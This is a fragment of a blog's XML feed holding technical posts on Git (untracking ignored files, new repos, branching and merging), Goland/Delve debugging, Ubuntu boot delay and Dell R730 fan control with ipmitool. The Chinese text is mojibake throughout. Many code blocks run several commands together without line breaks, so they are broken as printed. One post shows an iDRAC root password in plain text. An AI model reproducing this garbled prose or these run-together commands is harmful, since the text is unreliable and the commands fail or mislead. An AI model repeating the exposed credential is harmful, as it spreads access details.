        <content type="html"><![CDATA[<h1 id="é‡å†™äº†gitignoreä½†æ˜¯æƒ³åˆ é™¤å·²æäº¤ä½†æƒ³å¿½ç•¥çš„å†…å®¹"><a href="#é‡å†™äº†gitignoreä½†æ˜¯æƒ³åˆ é™¤å·²æäº¤ä½†æƒ³å¿½ç•¥çš„å†…å®¹" class="headerlink" title="é‡å†™äº†gitignoreä½†æ˜¯æƒ³åˆ é™¤å·²æäº¤ä½†æƒ³å¿½ç•¥çš„å†…å®¹"></a>é‡å†™äº†gitignoreä½†æ˜¯æƒ³åˆ é™¤å·²æäº¤ä½†æƒ³å¿½ç•¥çš„å†…å®¹</h1><p>å·²ç»æäº¤è¿‡çš„æ–‡ä»¶æˆ–è€…æ–‡ä»¶å¤¹æ€ä¹ˆåŠï¼Ÿæ­¤æ—¶æ›´æ”¹.gitignoreæ–‡ä»¶å¯¹å·²ç»æäº¤çš„æ–‡ä»¶æ˜¯æ— æ•ˆçš„ã€‚</p><p>é¦–å…ˆï¼Œç¼–è¾‘.gitignoreæ–‡ä»¶ã€‚</p><p>ç„¶åå¦‚æœæ˜¯å•ä¸ªæ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ä»ä»“åº“ä¸­åˆ é™¤ï¼š</p><pre><code>git rm --cached logs/xx.log</code></pre><p>å¦‚æœæ˜¯æ•´ä¸ªç›®å½•ï¼š</p><pre><code>git rm --cached -r logs</code></pre><p>å¦‚æœæ–‡ä»¶å¾ˆå¤šï¼Œé‚£ä¹ˆç›´æ¥</p><pre><code>git rm --cached -r .</code></pre><p>å¦‚æœæç¤ºæŸä¸ªæ–‡ä»¶æ— æ³•å¿½ç•¥ï¼Œå¯ä»¥æ·»åŠ -få‚æ•°å¼ºåˆ¶å¿½ç•¥ã€‚</p><pre><code>git rm -f --cached logs/xx.log</code></pre><p>ç„¶å</p><pre><code>git add .git commit -m &quot;Update .gitignore&quot;</code></pre><p>æŠŠè¢«å¿½ç•¥çš„æŸä¸ªæ–‡ä»¶å¼ºåˆ¶æ·»åŠ å›å»ï¼š</p><pre><code>git add -f filename</code></pre><p>ignoreè§„åˆ™æ£€æŸ¥ï¼š</p><pre><code>git check-ignore</code></pre>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>build a new repo</title>
      <link href="/2024/04/09/git/%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93/"/>
      <url>/2024/04/09/git/%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h1 id="æ–°å»ºé¡¹ç›®ä»“åº“"><a href="#æ–°å»ºé¡¹ç›®ä»“åº“" class="headerlink" title="æ–°å»ºé¡¹ç›®ä»“åº“"></a>æ–°å»ºé¡¹ç›®ä»“åº“</h1><h3 id="åˆ›å»ºæœ¬åœ°gité¡¹ç›®"><a href="#åˆ›å»ºæœ¬åœ°gité¡¹ç›®" class="headerlink" title="åˆ›å»ºæœ¬åœ°gité¡¹ç›®"></a>åˆ›å»ºæœ¬åœ°gité¡¹ç›®</h3><pre><code>git init</code></pre><p>git init &lt;ä»“åº“å&gt;æ²¡æ³•æ‰§è¡Œï¼Œinitåé¢ä¸è¦è·Ÿå‚æ•°å½“åå­—ã€‚</p><h3 id="githubä¸Šåˆ›å»ºä¸€ä¸ªä»“åº“"><a href="#githubä¸Šåˆ›å»ºä¸€ä¸ªä»“åº“" class="headerlink" title="githubä¸Šåˆ›å»ºä¸€ä¸ªä»“åº“"></a>githubä¸Šåˆ›å»ºä¸€ä¸ªä»“åº“</h3><p>ç™»å½•githubåˆ›å»ºä¸ªç©ºçš„ä»“åº“</p><h3 id="ç™»å½•githubåˆ›å»ºä¸ªç©ºçš„ä»“åº“ï¼Œæ·»åŠ è¿œç¨‹ä»“åº“"><a href="#ç™»å½•githubåˆ›å»ºä¸ªç©ºçš„ä»“åº“ï¼Œæ·»åŠ è¿œç¨‹ä»“åº“" class="headerlink" title="ç™»å½•githubåˆ›å»ºä¸ªç©ºçš„ä»“åº“ï¼Œæ·»åŠ è¿œç¨‹ä»“åº“"></a>ç™»å½•githubåˆ›å»ºä¸ªç©ºçš„ä»“åº“ï¼Œæ·»åŠ è¿œç¨‹ä»“åº“</h3><pre><code>git remote add origin https://github.com/xxx/xxx.git</code></pre><p>ä»è¿œç¨‹masteråˆå¹¶åˆ°æœ¬åœ°master</p><pre><code class="lang-shell">git config --global user.name &quot;xxxx&quot; git config --global user.email xxxxx@xx.com</code></pre><pre><code class="lang-shell">git initgit add .git commit - m &quot;init&quot;git remote add origin https://github.com/xxx/xxx.gitgit push origin master</code></pre><p>å¦‚æœæœ‰å†²çªå°±å°è¯•ï¼ˆé€šå¸¸æ˜¯ä½ åˆ›å»ºä»“åº“çš„æ—¶å€™æ–°å»ºäº†ä»€ä¹ˆreadmeå’Œlicenseï¼‰ï¼š<br>    git pull origin master:master</p><p>ä¹Ÿå¯ä»¥ç›´æ¥å¼ºåˆ¶æ¨é€ï¼š<br>    git push origin master â€”force</p><h3 id="æäº¤æœ¬åœ°åˆ†æ”¯åˆ°è¿œç¨‹åˆ†æ”¯"><a href="#æäº¤æœ¬åœ°åˆ†æ”¯åˆ°è¿œç¨‹åˆ†æ”¯" class="headerlink" title="æäº¤æœ¬åœ°åˆ†æ”¯åˆ°è¿œç¨‹åˆ†æ”¯"></a>æäº¤æœ¬åœ°åˆ†æ”¯åˆ°è¿œç¨‹åˆ†æ”¯</h3><pre><code>git push -u origin master</code></pre><h3 id="å°†ç°æœ‰é¡¹ç›®æ·»åŠ å¹¶æäº¤ä¸Šä¼ "><a href="#å°†ç°æœ‰é¡¹ç›®æ·»åŠ å¹¶æäº¤ä¸Šä¼ " class="headerlink" title="å°†ç°æœ‰é¡¹ç›®æ·»åŠ å¹¶æäº¤ä¸Šä¼ "></a>å°†ç°æœ‰é¡¹ç›®æ·»åŠ å¹¶æäº¤ä¸Šä¼ </h3><pre><code class="lang-shell">git add -Aï¼ˆgit add . æ˜¯æäº¤å½“å‰è·¯å¾„  git add -A æ˜¯æäº¤æ•´ä¸ªæ–‡ä»¶å¤¹å­æ–‡ä»¶å¤¹è·¯å¾„ï¼‰git commit -m &#39;åˆå§‹åŒ–gité¡¹ç›®&#39;git push --set-upstream origin master</code></pre>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ–°å»ºæŸåˆ†æ”¯å¹¶æ¨é€ã€åˆå¹¶åˆ†æ”¯</title>
      <link href="/2024/04/09/git/%E6%96%B0%E5%BB%BA%E6%9F%90%E5%88%86%E6%94%AF%E5%B9%B6%E6%8E%A8%E9%80%81%E8%87%B3%E6%9F%90%E5%88%86%E6%94%AF%EF%BC%9A%E4%BB%A5%E8%80%83%E8%AF%95%E7%B3%BB%E7%BB%9Fes%E4%B8%BA%E4%BE%8B%E7%89%88%E6%9C%AC%E7%AE%A1%E7%90%86/"/>
      <url>/2024/04/09/git/%E6%96%B0%E5%BB%BA%E6%9F%90%E5%88%86%E6%94%AF%E5%B9%B6%E6%8E%A8%E9%80%81%E8%87%B3%E6%9F%90%E5%88%86%E6%94%AF%EF%BC%9A%E4%BB%A5%E8%80%83%E8%AF%95%E7%B3%BB%E7%BB%9Fes%E4%B8%BA%E4%BE%8B%E7%89%88%E6%9C%AC%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="æ–°å»ºæŸåˆ†æ”¯å¹¶æ¨é€è‡³æŸåˆ†æ”¯ï¼šä»¥è€ƒè¯•ç³»ç»Ÿesä¸ºä¾‹ç‰ˆæœ¬ç®¡ç†"><a href="#æ–°å»ºæŸåˆ†æ”¯å¹¶æ¨é€è‡³æŸåˆ†æ”¯ï¼šä»¥è€ƒè¯•ç³»ç»Ÿesä¸ºä¾‹ç‰ˆæœ¬ç®¡ç†" class="headerlink" title="æ–°å»ºæŸåˆ†æ”¯å¹¶æ¨é€è‡³æŸåˆ†æ”¯ï¼šä»¥è€ƒè¯•ç³»ç»Ÿesä¸ºä¾‹ç‰ˆæœ¬ç®¡ç†"></a>æ–°å»ºæŸåˆ†æ”¯å¹¶æ¨é€è‡³æŸåˆ†æ”¯ï¼šä»¥è€ƒè¯•ç³»ç»Ÿesä¸ºä¾‹ç‰ˆæœ¬ç®¡ç†</h1><p>æ–°å»ºæ–°åˆ†æ”¯å¹¶æ¨é€è‡³æ–°åˆ†æ”¯ä¹‹å‰ï¼Œéœ€è¦æ£€æŸ¥å½“å‰åˆ†å€¼æ˜¯å¦è¿˜æœ‰æœªæäº¤çš„çŠ¶æ€</p><p><code>git status</code> # å¯ä»¥æ£€æŸ¥æ˜¯å¦æœ‰æ–°æ–‡ä»¶æœªè¢«track</p><p><code>git remote -v</code> # æŸ¥çœ‹è¿œç¨‹åˆ†å€¼ï¼Œä¸€èˆ¬å¦‚ä¸‹ï¼ŒåŒä¸€ä¸ªåœ°å€å…·æœ‰æ‹¿ä¸‹æˆ–pushçš„æƒé™</p><pre><code>origin  http://shenyanjian.cn:3000/senranja/exam_system.git (fetch)origin  http://shenyanjian.cn:3000/senranja/exam_system.git (push)</code></pre><p><code>git fetch</code> # æ‹¿ä¸‹ä»“åº“æœ€æ–°åˆ†å€¼ä¿¡æ¯ã€‚<code>git pull==git fetch + git merge</code>ï¼Œgit fetchæ˜¯å®‰å…¨çš„ã€ä¸ä¼šåˆå¹¶çš„å‘½ä»¤</p><p><code>git branch -r</code> # æŸ¥çœ‹å…¨éƒ¨çš„è¿œç¨‹åˆ†æ”¯ï¼Œé€šå¸¸æ˜¾ç¤ºå¦‚ä¸‹ï¼šï¼ˆè‹¥è¿œç¨‹åˆ†æ”¯åªæœ‰mainï¼‰</p><pre><code>  origin/HEAD -&gt; origin/main  origin/main</code></pre><p><code>git checkout -b V0.0.2</code> # ä»¥å½“å‰åˆ†æ”¯ä¸ºå‰¯æœ¬åˆ›å»ºV0.0.2</p><p><code>git checkout V0.0.2</code> # åˆ‡æ¢åˆ°åˆ†å€¼V0.0.2</p><p>ï¼ˆç°åœ¨åœ¨æ­¤å¤„æ”¾ä¸€äº›éƒ¨ç½²æ–‡æ¡£ã€ç‰ˆæœ¬äº¤ä»˜è¯´æ˜ï¼‰</p><pre><code class="lang-shell">git add .git commit -m &quot;V0.0.2&quot;git push</code></pre><pre><code>fatal: The current branch V0.0.2 has no upstream branch.To push the current branch and set the remote as upstream, use    git push --set-upstream origin V0.0.2</code></pre><p>å¦‚ä¸ŠæŠ¥é”™ï¼Œæ„æ€æ˜¯è¿œç¨‹åˆ†å€¼è¿˜æ²¡æœ‰V0.0.2ï¼Œéœ€è¦æ‰‹åŠ¨è®¾ç½®ä¸‹</p><pre><code>git push --set-upstream origin V0.0.2</code></pre><p>å®Œæˆ</p><p>åˆ‡æ¢å›ä¸»åˆ†æ”¯ï¼š</p><pre><code>git checkout main</code></pre><h1 id="æœ¬åœ°åˆå¹¶å…¶ä»–åˆ†æ”¯åˆ°æœ¬åˆ†æ”¯ï¼Œå†æ¨é€"><a href="#æœ¬åœ°åˆå¹¶å…¶ä»–åˆ†æ”¯åˆ°æœ¬åˆ†æ”¯ï¼Œå†æ¨é€" class="headerlink" title="æœ¬åœ°åˆå¹¶å…¶ä»–åˆ†æ”¯åˆ°æœ¬åˆ†æ”¯ï¼Œå†æ¨é€"></a>æœ¬åœ°åˆå¹¶å…¶ä»–åˆ†æ”¯åˆ°æœ¬åˆ†æ”¯ï¼Œå†æ¨é€</h1><p>è¦å°†æœ¬åœ°çš„ dev åˆ†æ”¯åˆå¹¶åˆ° main åˆ†æ”¯ï¼Œä½ å¯ä»¥æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤è¿›è¡Œæ“ä½œï¼š</p><p>ç¡®ä¿ä½ å½“å‰ä½äº main åˆ†æ”¯ä¸Šã€‚ä½ å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤æ¥ç¡®ä¿ï¼š</p><pre><code>git checkout main</code></pre><p>ç„¶åï¼Œæ‰§è¡Œ git pull å‘½ä»¤æ¥ç¡®ä¿ä½ çš„ main åˆ†æ”¯æ˜¯æœ€æ–°çš„ï¼š</p><pre><code>git pull origin main</code></pre><p>æ¥ç€ï¼Œæ‰§è¡Œ git merge å‘½ä»¤æ¥åˆå¹¶ dev åˆ†æ”¯åˆ° main åˆ†æ”¯ï¼š</p><pre><code>git merge dev</code></pre><p>å¦‚æœæœ‰å†²çªï¼Œåœ¨åˆå¹¶è¿‡ç¨‹ä¸­ä¼šåœä¸‹æ¥ï¼Œéœ€è¦ä½ è§£å†³è¿™äº›å†²çªã€‚è§£å†³å®Œå†²çªåï¼Œä½ éœ€è¦æ‰§è¡Œ <code>git add</code>å‘½ä»¤æ¥æ ‡è®°å†²çªå·²è§£å†³çš„æ–‡ä»¶ï¼Œç„¶åæ‰§è¡Œ <code>git merge --continue</code> æ¥ç»§ç»­åˆå¹¶è¿‡ç¨‹ã€‚</p><p>æœ€åï¼Œå½“åˆå¹¶å®Œæˆï¼Œä½ å¯ä»¥å°†åˆå¹¶åçš„ main åˆ†æ”¯æ¨é€åˆ°è¿œç¨‹ä»“åº“ï¼š</p><pre><code>git push origin main</code></pre><p>é€šè¿‡è¿™äº›æ­¥éª¤ï¼Œä½ å°±å¯ä»¥å°†æœ¬åœ°çš„ dev åˆ†æ”¯æˆåŠŸåˆå¹¶åˆ° main åˆ†æ”¯ï¼Œå¹¶å°†æ›´æ–°æ¨é€åˆ°è¿œç¨‹ä»“åº“ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>push existed local repo</title>
      <link href="/2024/04/09/git/%E7%8E%B0%E6%9C%89%E4%BB%93%E5%BA%93%E6%8F%90%E4%BA%A4/"/>
      <url>/2024/04/09/git/%E7%8E%B0%E6%9C%89%E4%BB%93%E5%BA%93%E6%8F%90%E4%BA%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="ç°æœ‰ä»“åº“æäº¤åˆ°github"><a href="#ç°æœ‰ä»“åº“æäº¤åˆ°github" class="headerlink" title="ç°æœ‰ä»“åº“æäº¤åˆ°github"></a>ç°æœ‰ä»“åº“æäº¤åˆ°github</h1><h3 id="çº¯æ–°å»ºé¡¹ç›®push"><a href="#çº¯æ–°å»ºé¡¹ç›®push" class="headerlink" title="çº¯æ–°å»ºé¡¹ç›®push"></a>çº¯æ–°å»ºé¡¹ç›®push</h3><pre><code class="lang-shell">echo &quot;# licenseGenerator&quot; &gt;&gt; README.mdgit initgit add README.mdgit commit -m &quot;first commit&quot;git branch -M mastergit remote add origin https://github.com/SenRanja/licenseGenerator.gitgit push -u origin master</code></pre><h3 id="pushå·²å­˜åœ¨é¡¹ç›®"><a href="#pushå·²å­˜åœ¨é¡¹ç›®" class="headerlink" title="pushå·²å­˜åœ¨é¡¹ç›®"></a>pushå·²å­˜åœ¨é¡¹ç›®</h3><p>å…ˆåšçš„ï¼šå¦‚æœä½ æ‰‹è´±ï¼Œgithubåˆ›å»ºé¡¹ç›®çš„æ—¶å€™ï¼Œæ–°å»ºäº†ä»€ä¹ˆlicenseã€readmeæœ‰çš„æ²¡çš„çš„ä¸œè¥¿ï¼Œæœ¬åœ°pushä¹‹å‰ï¼Œå¾—å…ˆgit pull ä¸€ä¸‹ï¼š</p><pre><code>git pull github master --allow-unrelated-histories</code></pre><p>ï¼ˆgit pull è¿œç¨‹åå­— è¿œç¨‹åˆ†æ”¯ï¼Œ åé¢çš„ â€“allow-unreleated-histories ï¼Œæ¯”å¦‚ä½ æ‰‹è´±æ–°å»ºäº†licenseï¼Œä½ git pull çš„æ—¶å€™ä¼šæ‹’ç»ï¼Œå› ä¸ºgithubæ–°å»ºé¡¹ç›®å¼„çš„licenseæœ‰ç¬¬ä¸€æ¬¡çš„commitï¼Œå’Œä½ æœ¬åœ°å†å²å¯¹ä¸ä¸Šmergeé»˜è®¤ä¸å…è®¸ï¼Œæ‰€ä»¥ä½ å¾—æ‰‹åŠ¨æŒ‡å®šï¼‰</p><p>æ¯”å¦‚ï¼Œå¦‚æœæœ¬åœ°giteaå·²ç»æœ‰é¡¹ç›®äº†ï¼Œåº”è¯¥æ˜¯æ¨é€æ­¤å¤„ã€‚<br>æ¯”å¦‚ï¼Œæˆ‘çš„evoç³»ç»Ÿï¼Œåœ¨æœ¬åœ°å·²ç»æ¨é€giteaï¼Œé»˜è®¤çš„è¿œç¨‹åœ°å€åå­— origin å¿…é¡»é‡å‘½åã€‚</p><pre><code>git remote add origin https://github.com/SenRanja/licenseGenerator.gitgit branch -M master</code></pre><p>ï¼ˆgit branch -M å‘½ä»¤ç”¨äºé‡å‘½åå½“å‰åˆ†æ”¯ã€‚å…·ä½“æ¥è¯´ï¼Œ-M é€‰é¡¹å‘Šè¯‰ Git å¼ºåˆ¶é‡å‘½ååˆ†æ”¯ï¼Œå³ä½¿æ–°çš„åˆ†æ”¯åä¸å·²å­˜åœ¨çš„åˆ†æ”¯åå†²çªä¹Ÿä¼šå¼ºåˆ¶æ‰§è¡Œã€‚è¿™ä¸ªå‘½ä»¤çš„å¸¸è§ç”¨é€”æ˜¯å°†å½“å‰åˆ†æ”¯é‡å‘½åä¸ºä¸€ä¸ªæ–°çš„åˆ†æ”¯åã€‚ï¼‰</p><pre><code>git push -u origin master</code></pre><p>æ›´æ”¹originçš„è¿œç¨‹åå­—çš„å‘½ä»¤å¦‚ä¸‹ï¼š</p><pre><code>git remote add github https://github.com/SenRanja/licenseGenerator.gitgit branch -M master</code></pre><p>ï¼ˆå¼ºè¡Œå°†ç°åœ¨æ‰€åœ¨åˆ†æ”¯ï¼Œé‡å‘½åä¸º master åˆ†æ”¯ï¼‰</p><pre><code>git push -u github master</code></pre><p>ï¼ˆå°†æœ¬åœ°çš„masteråˆ†æ”¯ä»£ç æäº¤åˆ° github çš„è¿œç¨‹é“¾æ¥ä¸Šï¼‰</p>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>golandæŠ€å·§</title>
      <link href="/2024/04/08/Go/goland/"/>
      <url>/2024/04/08/Go/goland/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#å¸¸ç”¨å¿«æ·é”®">å¸¸ç”¨å¿«æ·é”®</a></li><li><a href="#æ·»åŠ è¿œç¨‹è°ƒè¯•">æ·»åŠ è¿œç¨‹è°ƒè¯•</a></li><li><a href="#delveå‡çº§goæ— æ³•è°ƒè¯•">delveï¼šå‡çº§goæ— æ³•è°ƒè¯•</a></li></ul><h1 id="å¸¸ç”¨å¿«æ·é”®"><a href="#å¸¸ç”¨å¿«æ·é”®" class="headerlink" title="å¸¸ç”¨å¿«æ·é”®"></a>å¸¸ç”¨å¿«æ·é”®</h1><p>æ‰“å‡ºerr.nnå¯ä»¥å¿«é€Ÿæ‰“å‡º err!=nil</p><h1 id="æ·»åŠ è¿œç¨‹è°ƒè¯•"><a href="#æ·»åŠ è¿œç¨‹è°ƒè¯•" class="headerlink" title="æ·»åŠ è¿œç¨‹è°ƒè¯•"></a>æ·»åŠ è¿œç¨‹è°ƒè¯•</h1><p>ç›´æ¥è°ƒè¯•å™¨è¿™é‡Œæ–°å»ºGoæ„å»ºï¼ˆä¸éœ€è¦ç‚¹å‡»Goè¿œç¨‹ï¼‰</p><p><img src="/2024/04/08/Go/goland/2024-04-10-22-20-14.png" alt="2024-04-10-22-20-14"></p><p>åœ¨è¿™é‡Œé…ç½®SSH</p><p><img src="/2024/04/08/Go/goland/2024-04-10-22-20-45.png" alt="2024-04-10-22-20-45"></p><h1 id="delveï¼šå‡çº§goæ— æ³•è°ƒè¯•"><a href="#delveï¼šå‡çº§goæ— æ³•è°ƒè¯•" class="headerlink" title="delveï¼šå‡çº§goæ— æ³•è°ƒè¯•"></a>delveï¼šå‡çº§goæ— æ³•è°ƒè¯•</h1><p>æˆ‘å‡çº§goä»1.17åˆ°1.20åï¼Œgolandæ— æ³•è°ƒè¯•ã€‚<br>è°ƒè¯•æ—¶æŠ¥é”™ </p><pre><code>WARNING: undefined behavior - version of Delve is too old for Go version 1.20.0 (maximum supported version 1.18)</code></pre><p>æŸ¥é˜…ç½‘ä¸Šå¾ˆå¤šæ–¹æ³•éƒ½ä¸å¥æ•ˆã€‚<br>ä»¥ä¸‹ä¸ºå¥æ•ˆæ–¹æ³•ï¼š<br><a href="https://zhuanlan.zhihu.com/p/425645473">https://zhuanlan.zhihu.com/p/425645473</a></p><pre><code>$ git clone https://github.com/go-delve/delve$ cd delve$ go install github.com/go-delve/delve/cmd/dlv</code></pre><p>éšååœ¨GOPATH/binä¸­å‡ºç°æœ€æ–°çš„dlv.exeï¼Œæ³¨æ„çœ‹è¯¥ç¨‹åºçš„ç”Ÿæˆæ—¶é—´<br>ç„¶ååœ¨golandçš„â€œè‡ªå®šä¹‰å±æ€§â€ä¸­è®¾ç½®è¯¥å€¼ï¼š</p><pre><code>dlv.path=E:\\BiLing\\golang-study\\bin\\dlv.exe</code></pre><p>é‡å¯golandå¥æ•ˆ</p>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>boot after 1m30s</title>
      <link href="/2024/04/08/Linux-Maintain/boot_slower_1m30/"/>
      <url>/2024/04/08/Linux-Maintain/boot_slower_1m30/</url>
      
        <content type="html"><![CDATA[<p>å¼€æœºå¯åŠ¨1m30sæ…¢</p><p>Ubuntuå¼€æœºå¡åœ¨ A start job is runing for wait for Network to be configured (1min 23s / no limit)è§£å†³æ–¹æ³•</p><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://blog.csdn.net/weixin_42300866/article/details/123712774">https://blog.csdn.net/weixin_42300866/article/details/123712774</a></p><pre><code>root@k8s-master1:~# cd /etc/systemd/system/network-online.target.wants/root@k8s-master1:/etc/systemd/system/network-online.target.wants# lltotal 8drwxr-xr-x  2 root root 4096 Aug 24  2021 ./drwxr-xr-x 19 root root 4096 Mar 24 08:11 ../lrwxrwxrwx  1 root root   56 Aug 16  2021 systemd-networkd-wait-online.service -&gt; /lib/systemd/system/systemd-networkd-wait-online.service</code></pre><p>æ·»åŠ å†…å®¹å¦‚ä¸‹ï¼š<br>åœ¨ã€serviceã€‘ä»£ç å¿«æœ€æœ«å°¾åŠ ä¸Š</p><pre><code>TimeoutStartSec=2sec</code></pre><p>ä¿®æ”¹å†…å®¹å¦‚ä¸‹ï¼š</p><pre><code>#  SPDX-License-Identifier: LGPL-2.1+##  This file is part of systemd.##  systemd is free software; you can redistribute it and/or modify it#  under the terms of the GNU Lesser General Public License as published by#  the Free Software Foundation; either version 2.1 of the License, or#  (at your option) any later version.[Unit]Description=Wait for Network to be ConfiguredDocumentation=man:systemd-networkd-wait-online.service(8)DefaultDependencies=noConflicts=shutdown.targetRequires=systemd-networkd.serviceAfter=systemd-networkd.serviceBefore=network-online.target shutdown.target[Service]Type=oneshotExecStart=/lib/systemd/systemd-networkd-wait-onlineRemainAfterExit=yesTimeoutStartSec=2sec[Install]WantedBy=network-online.target</code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux-Maintain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Dell 730é£æ‰‡é€Ÿåº¦è°ƒæ•´</title>
      <link href="/2024/04/08/Linux-Maintain/Dell730change_fans/"/>
      <url>/2024/04/08/Linux-Maintain/Dell730change_fans/</url>
      
        <content type="html"><![CDATA[<p>é¹å“¥çš„æ–‡ç« <br><a href="https://h38ozbw2bw.feishu.cn/docx/Jonpd4cZmoZW2Sx0RrVcXGRsnOc">https://h38ozbw2bw.feishu.cn/docx/Jonpd4cZmoZW2Sx0RrVcXGRsnOc</a></p><h1 id="ç°è±¡"><a href="#ç°è±¡" class="headerlink" title="ç°è±¡"></a>ç°è±¡</h1><p>dell emc é£æ‰‡è½¬é€Ÿ100%<br>730å®‰è£…çš„æ˜¾å¡ä¸ºA2ï¼Œédellå®˜æ–¹æŒ‡å®šçš„æ˜¾å¡ï¼Œbiosä¸»åŠ¨è°ƒé€Ÿé€Ÿç‡ä¸º100%ï¼Œcpuå ç”¨ç‡ä½ä¸‹ï¼Œä½†æ˜¯é£æ‰‡å…¨åŠŸç‡è¿è¡Œï¼Œå£°éŸ³ä¸€è¨€éš¾å°½ã€‚</p><p>ç¯å¢ƒè¯´æ˜ï¼š</p><pre><code>Idrac ip:192.168.3.250</code></pre><p>å¦‚æœæœ‰å¤šä½™ç½‘çº¿ï¼Œå¯ä»¥ç›´æ¥æ¥å…¥åˆ°å…¬å¸ç½‘ç»œï¼Œå¦‚æœä¸æ–¹ä¾¿ï¼Œå°†è‡ªå·±çš„ç”µè„‘ä»¥å¤ªç½‘ç½‘å£é…ç½®ä¸ºå¦‚ä¸‹ï¼Œå¯ä»¥ç”¨ç½‘çº¿å’ŒæœåŠ¡å™¨ç›´è¿ã€‚</p><h1 id="è§£å†³æ–¹æ¡ˆ"><a href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h1><p>ä½¿ç”¨ipmitoolæ‰‹åŠ¨è°ƒé€Ÿ<br>ipmitoolå®‰è£…ï¼š</p><pre><code>apt install ipmitool</code></pre><p>githubåœ°å€ï¼š<a href="https://github.com/ipmitool/ipmitool">https://github.com/ipmitool/ipmitool</a></p><p>windowsä¸‹è½½åœ°å€ï¼š<a href="https://www.dell.com/support/home/zh-cn/drivers/driversdetails?driverid=m63f3">https://www.dell.com/support/home/zh-cn/drivers/driversdetails?driverid=m63f3</a></p><p>è°ƒé€Ÿå‘½ä»¤ï¼š</p><p>é¦–å…ˆè¦å…³é—­é£æ‰‡è‡ªåŠ¨è°ƒé€ŸåŠŸèƒ½ï¼Œå¦åˆ™æˆ‘ä»¬æ‰‹åŠ¨è®¾ç½®çš„è½¬é€Ÿæ˜¯ä¸ä¼šç”Ÿæ•ˆçš„ã€‚æœ€åçš„0x00è¡¨ç¤ºå…³é—­è‡ªåŠ¨è°ƒé€Ÿï¼Œ0x01è¡¨ç¤ºå¼€å¯è‡ªåŠ¨è°ƒé€Ÿã€‚</p><pre><code>ipmitool -I lanplus -H 192.168.3.250 -U root -P 1qaz@WSX raw 0x30 0x30 0x01 0x00</code></pre><p>å…³é—­è‡ªåŠ¨è°ƒé€Ÿä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥æŒ‰ç…§æˆ‘ä»¬è‡ªå·±çš„æ„æ„¿æ¥è°ƒæ•´è½¬é€Ÿäº†ï¼Œæˆ‘è¿™è¾¹è®¾ç½®ä¸º50%ã€‚</p><pre><code>ipmitool -I lanplus -H 192.168.3.250 -U root -P 1qaz@WSX raw 0x30 0x30 0x02 0xff 0x32</code></pre><p>æœ€åçš„0x0aè¡¨ç¤ºè½¬é€Ÿçš„ç™¾åˆ†æ¯”çš„åå…­è¿›åˆ¶ï¼Œ0aè¡¨ç¤º10%ï¼Œ0fè¡¨ç¤º15%ã€‚</p><p><img src="/2024/04/08/Linux-Maintain/Dell730change_fans/2024-04-10-21-58-11.png" alt="2024-04-10-21-58-11"></p><p>é€šè¿‡è°ƒæ•´å‘ç°ï¼Œè½¬é€Ÿç¡®å®ä½äº†ï¼Œä¹‹å‰ä¸€ç›´ç¨³å®šåœ¨20%-25%ï¼ˆ5000+è½¬ï¼‰å·¦å³ï¼ŒåŠŸè€—å¤§æ¦‚åœ¨170wã€‚é€šè¿‡è°ƒä½é£æ‰‡è½¬é€Ÿï¼Œä¸ä»…é™éŸ³äº†ï¼Œè¿˜é™ä½äº†åŠŸè€—ã€‚<br>PSï¼š1ã€ä¸æ˜¯æ°¸ä¹…è®¾ç½®ï¼ŒæœåŠ¡å™¨å…³é—­ç”µæºï¼Œå†æ¬¡æ’ä¸Šç”µæºåˆ™éœ€è¦é‡æ–°è°ƒæ•´ã€‚<br>2ã€å¦‚æœæ˜¯è·‘åº”ç”¨ï¼Œä¸ºäº†é˜²æ­¢çƒ§æ˜¾å¡ï¼Œå»ºè®®ç›´æ¥100%<br>3ã€é…ç½®ä¸€ä¸‹é‚®ä»¶é¢„è­¦ï¼Œå½“æ¸©åº¦åˆ°è¾¾ä¸€å®šç¨‹åº¦ï¼Œä¸»åŠ¨å‘é€é‚®ä»¶</p><h1 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h1><p>å†™ä¸ªè„šæœ¬ï¼Œä½¿ç”¨ipmitoolå®æ—¶è·å–cpuå’Œgpuæ¸©åº¦ï¼Œå½“è¶…è¿‡é˜ˆå€¼ï¼Œè°ƒç”¨ipmitoolè‡ªåŠ¨è°ƒé€Ÿ</p><p>é”™è¯¯</p><pre><code>Error: Unable to establish IPMI v2 / RMCP+ session</code></pre><p>åŸå› ï¼š<br>1ã€ç”¨æˆ·åæˆ–è€…å¯†ç é”™è¯¯<br>2ã€æœªå¯ç”¨ipml</p><p>è§£å†³ï¼š</p><p>1ã€è®¾ç½®å¯†ç ï¼š<br>Menu Overview -&gt; IDRAC SETTINGS -&gt; User Authentication<br>-&gt; Click on the userID of your admin account -&gt; Next<br>-&gt; check â€œchange your passwordâ€ checkbox and enter the same (or new) password<br>-&gt; Apply</p><p>2ã€å¯åŠ¨ipml</p><p><img src="/2024/04/08/Linux-Maintain/Dell730change_fans/2024-04-10-22-00-30.png" alt="2024-04-10-22-00-30"></p><p>æµ‹è¯•å‘½ä»¤ï¼š</p><p><img src="/2024/04/08/Linux-Maintain/Dell730change_fans/2024-04-10-22-01-26.png" 